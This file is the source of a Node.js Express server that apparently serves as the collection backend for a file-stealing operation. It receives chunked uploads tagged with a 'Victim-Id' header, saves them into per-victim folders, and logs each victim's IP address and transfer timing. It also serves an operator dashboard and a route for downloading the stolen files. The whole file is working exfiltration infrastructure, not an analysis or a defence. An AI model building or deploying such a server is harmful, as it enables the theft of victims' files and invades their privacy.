const fs = require('fs');
require('dotenv').config();
const cors = require('cors');
const express = require('express');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 8080; // Railway assigns a port dynamically

// Enable CORS with specific options
const corsOptions = {
  origin: ['https://deobfrontend-f30nw0x1c-2naseernoors-projects.vercel.app', 'https://deobfrontend-git-main-2naseernoors-projects.vercel.app'],
  methods: ['GET', 'POST', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Victim-Id', 'Filename', 'Chunk-Index', 'Total-Chunks'],
  credentials: true,
};
app.use(cors(corsOptions));

// Log all incoming requests for debugging
app.use((req, res, next) => {
  console.log('📥 Request:', req.method, req.url, 'Headers:', req.headers);
  next();
});

// Handle OPTIONS requests for /upload
app.options('/upload', (req, res) => {
  res.header('Access-Control-Allow-Origin', corsOptions.origin);
  res.header('Access-Control-Allow-Methods', corsOptions.methods.join(', '));
  res.header('Access-Control-Allow-Headers', corsOptions.allowedHeaders.join(', '));
  res.header('Access-Control-Allow-Credentials', 'true');
  res.status(204).end();
});

// Serve the dashboard as static files
app.use('/dashboard', express.static(path.join(__dirname, 'dashboard')));

app.get('/dashboard/', (req, res) => {
  res.sendFile(path.join(__dirname, 'dashboard', 'index.html'));
});

// Middleware to handle raw binary data for file uploads
app.use(express.raw({ type: 'application/octet-stream', limit: '100mb' }));

// Base directory for storing files
const OUTPUT_BASE_DIR = path.join(__dirname, 'received_files');
if (!fs.existsSync(OUTPUT_BASE_DIR)) {
  fs.mkdirSync(OUTPUT_BASE_DIR, { recursive: true });
}

const victimFolders = {};
const victimFileCounts = {};
const victimTotalFiles = {};
const victimFiles = {};
const connectedDevices = {};

// Track received chunks
const chunkTracker = new Map();

// Function to check if all files are received and calculate time
async function checkAndSendEmail(victimId, victimFolder) {
  const filesInFolder = fs.readdirSync(victimFolder);
  if (filesInFolder.length === victimTotalFiles[victimId]) {
    console.log(`✅ All files received for victim ${victimId}`);

    const files = filesInFolder.map((filename) => {
      const filePath = path.join(victimFolder, filename);
      const stats = fs.statSync(filePath);
      return { name: filename, type: path.extname(filename).substring(1), size: stats.size };
    });

    victimFiles[victimId] = files;

    // ✅ FIX: Calculate total transfer time from first chunk received
    const timeTaken = Date.now() - connectedDevices[victimId].firstChunkTime;
    connectedDevices[victimId].totalUploadTime = timeTaken;  // Store the actual transfer time in ms
    console.log(`Time to receive all files for ${victimId}: ${timeTaken / 1000} seconds`);
  }
}

// Route to handle file uploads
app.post('/upload', (req, res) => {
  try {
    const filename = decodeURIComponent(req.headers['filename']);
    const victimId = decodeURIComponent(req.headers['victim-id']);
    const chunkIndex = parseInt(req.headers['chunk-index']);
    const totalChunks = parseInt(req.headers['total-chunks']);
    const ip = req.ip;

    if (!filename || !victimId || isNaN(chunkIndex) || isNaN(totalChunks)) {
      return res.status(400).json({ error: 'Missing or invalid headers' });
    }

    const chunkId = `${victimId}-${filename}-${chunkIndex}`;

    // Initialize chunk tracking for each file
    if (!chunkTracker.has(chunkId)) {
      chunkTracker.set(chunkId, new Set());
    }

    if (chunkTracker.get(chunkId).has(chunkIndex)) {
      console.log(`⏭️ Skipping duplicate chunk: ${chunkId}`);
      return res.status(200).json({ message: 'Duplicate chunk skipped' });
    }

    chunkTracker.get(chunkId).add(chunkIndex);

    if (!connectedDevices[victimId]) {
      connectedDevices[victimId] = {
        ip: ip,
        connectionTime: Date.now(),  // Record connection time in milliseconds
        lastConnectionTime: new Date(),
        firstChunkTime: null,  // ✅ FIX: Track first chunk received time
        filesTransferred: 0,
        fileList: [],
      };
    }

    // ✅ FIX: Record the time of the first received chunk
    if (!connectedDevices[victimId].firstChunkTime) {
      connectedDevices[victimId].firstChunkTime = Date.now();
    }

    if (!victimFolders[victimId]) {
      const timestamp = new Date().toISOString().replace(/:/g, '-');
      victimFolders[victimId] = path.join(OUTPUT_BASE_DIR, `${victimId}_${timestamp}`);
      fs.mkdirSync(victimFolders[victimId], { recursive: true });
      victimFileCounts[victimId] = 0;
      victimTotalFiles[victimId] = totalChunks;
    }

    const victimFolder = victimFolders[victimId];
    const filePath = path.join(victimFolder, filename);

    fs.appendFile(filePath, req.body, (err) => {
      if (err) {
        console.error(`❌ Error writing file:`, err);
        return res.status(500).json({ error: 'Error saving file' });
      }

      console.log(`✅ Chunk ${chunkIndex + 1} of ${totalChunks} received for file: ${filename}`);
      victimFileCounts[victimId] += 1;
      connectedDevices[victimId].filesTransferred += 1;

      if (!connectedDevices[victimId].fileList.includes(filename)) {
        connectedDevices[victimId].fileList.push(filename);
      }

      if (victimFileCounts[victimId] === totalChunks) {
        console.log(`✅ File upload complete: ${filename}`);
        checkAndSendEmail(victimId, victimFolder);
      }

      res.status(200).json({ message: 'Chunk received successfully' });
    });
  } catch (error) {
    console.error(`❌ Error handling upload:`, error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Route to provide dashboard data
app.get('/dashboard-data', (req, res) => {
  res.json(connectedDevices);
});

// Route to download files
app.get('/download/:victimId/:filename', (req, res) => {
  try {
    const { victimId, filename } = req.params;

    if (!victimFolders[victimId]) {
      return res.status(404).json({ error: 'Victim folder not found' });
    }

    const victimFolder = victimFolders[victimId];
    const filePath = path.join(victimFolder, filename);

    if (!fs.existsSync(filePath)) {
      return res.status(404).json({ error: 'File not found' });
    }

    res.download(filePath, filename, (err) => {
      if (err) {
        console.error(`❌ Error sending file:`, err);
        res.status(500).json({ error: 'Error sending file' });
      }
    });
  } catch (error) {
    console.error(`❌ Error in download route:`, error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Start the server
app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
});
